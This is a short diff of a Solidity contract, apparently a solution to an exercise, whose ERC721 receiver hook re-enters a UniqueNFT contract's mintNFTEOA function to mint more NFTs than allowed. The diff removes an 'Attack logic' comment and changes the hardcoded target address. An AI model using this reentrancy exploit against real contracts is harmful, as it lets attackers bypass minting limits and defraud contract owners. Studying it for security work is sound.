@@ -13,7 +13,6 @@ contract SimpleDelegateContract is IERC721Receiver {
         uint256 value;
     }
 
-    // --- Attack logic ---
     // UniqueNFT address is hardcoded in onERC721Received
 
     // ERC721 Receiver hook
@@ -25,7 +24,7 @@ contract SimpleDelegateContract is IERC721Receiver {
     ) external override returns (bytes4) {
         if (tokenId < 2) {
             // Re-enter mintNFTEOA to mint another NFT
-            UniqueNFT(0xB8CF7547Fb6E6e5E9B456Dc12D126f2BAB26F9f1).mintNFTEOA();
+            UniqueNFT(0x0A3C8FE5AcCF6e7DfFEafAb59823d2DF59d65eA7).mintNFTEOA();
         }
         return this.onERC721Received.selector;
     }
